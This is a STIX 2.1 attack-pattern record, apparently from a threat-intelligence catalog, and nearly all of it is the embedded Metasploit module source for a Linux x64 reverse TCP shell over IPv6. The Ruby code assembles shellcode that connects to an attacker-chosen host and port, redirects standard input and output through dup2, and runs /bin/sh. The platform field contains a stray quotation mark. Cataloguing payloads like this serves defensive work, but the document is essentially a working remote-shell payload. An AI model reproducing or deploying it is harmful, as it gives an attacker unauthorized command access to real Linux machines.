{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4189488e-1b6c-40c0-8f6c-44d5e084d272",
    "created": "2024-08-14T16:33:19.460243Z",
    "modified": "2024-08-14T16:33:19.460247Z",
    "name": "Linux x64 Command Shell, Reverse TCP Inline (IPv6)",
    "description": "Connect back to attacker and spawn a command shell over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/shell_reverse_ipv6_tcp.rb",
            "external_id": "shell_reverse_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 90\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux x64 Command Shell, Reverse TCP Inline (IPv6)',\n      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',\n      'Author'        => 'epi <epibar052[at]gmail.com>',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      ))\n      register_options([\n         OptInt.new('SCOPEID', [false, \"IPv6 scope ID, for link-local addresses\", 0])\n      ])\n  end\n\n  def convert_input(value, padding, reverse=false)\n      # converts value to comma separated string of\n      # zero-padded bytes to be used in the db instruction\n      arr = value.to_s(16).rjust(padding, \"0\").scan(/../)\n\n      if reverse\n        arr = arr.reverse\n      end\n\n      arr.map{ |x| sprintf(\"0x%02x\", x.hex) }.join(',')\n  end\n\n  def generate(opts={})\n      # 22 -> \"0x00,0x16\"\n      # 4444 -> \"0x11,0x5c\"\n      tcp_port = convert_input(datastore['LPORT'], 4)\n\n      # 0 -> \"0x00,0x00,0x00,0x00\"\n      scope_id = convert_input(datastore['SCOPEID'], 8, true)\n\n      # ::1 -> \"0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01\"\n      # dead:beef:2::1009 -> \"0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09\"\n      ipv6_addr = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET6).to_i, 32)\n\n      payload = <<-EOS\n        socket_call:\n            ; int socket(int domain, int type, int protocol)\n\n            push   0x29\n            pop    rax                          ; socket syscall\n            push   0xa\n            pop    rdi                          ; AF_INET6\n            push   0x1\n            pop    rsi                          ; SOCK_STREAM\n            xor    edx,edx                      ; auto-select protocol \n            syscall\n\n            push   rax\n            pop    rdi                          ; store socket fd \n            jmp get_address                     ; jmp-call-pop\n\n        populate_sockaddr_in6:\n            ; struct sockaddr_in6 {\n            ;     sa_family_t     sin6_family;   /* AF_INET6 */\n            ;     in_port_t       sin6_port;     /* port number */\n            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */\n            ;     struct in6_addr sin6_addr;     /* IPv6 address */\n            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */\n            ; };\n\n            ; struct in6_addr {\n            ;     unsigned char   s6_addr[16];   /* IPv6 address */\n            ; };\n\n            pop rsi                             ; store pointer to struct\n\n        connect_call:\n            ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);\n            ; rdi -> already contains server socket fd\n            ; rsi -> already contains pointer to sockaddr_in6 struct \n            push   0x2a\n            pop    rax                          ; connect syscall \n            push   0x1c\n            pop    rdx                          ; length of sockaddr_in6 (28)\n            syscall\n\n        dup2_calls:\n            ; int dup2(int oldfd, int newfd);\n            ; rdi -> already contains server socket fd\n            push   0x3\n            pop    rsi                          ; newfd \n\n        dup2_loop:\n            ; 2 -> 1 -> 0 (3 iterations)\n            push   0x21\n            pop    rax                          ; dup2 syscall\n            dec esi\n            syscall\n            loopnz   dup2_loop\n\n        exec_call:\n            ; int execve(const char *filename, char *const argv[], char *const envp[]);\n            push 0x3b\n            pop rax                             ; execve call\n            cdq                                 ; zero-out rdx via sign-extension\n            mov rbx, '/bin/sh'\n            push rbx\n            push rsp\n            pop rdi                             ; address of /bin/sh\n            syscall\n\n        get_address:\n            call populate_sockaddr_in6\n            ; sin6_family(2), sin6_port(2), sin6_flowinfo(4), sockaddr_in6(16), sin6_scope_id(4)\n            db 0x0a,0x00,#{tcp_port},0x00,0x00,0x00,0x00,#{ipv6_addr},#{scope_id}\n      EOS\n\n      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}